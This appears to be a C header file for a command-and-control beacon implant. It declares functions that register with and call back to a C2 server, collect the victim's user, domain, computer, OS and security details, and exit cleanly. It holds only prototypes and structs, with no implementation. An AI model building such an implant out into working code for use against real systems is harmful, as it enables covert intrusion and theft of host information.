BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize);
LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize);
BOOL GetBasicUserInfo(PCHAR lpcUserName, PCHAR lpcDomainName, PCHAR lpcComputerName);
BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo);

LPVOID DieCleanly();

LPVOID ReportExecutionFail();

struct BasicUserInfo
{
    LPSTR UserName;
    LPSTR ComputerName;
    LPSTR DomainName;
};

struct BasicCompInfo
{
    LPSTR Arch;
    LPSTR OS;
    LPSTR Secure;
};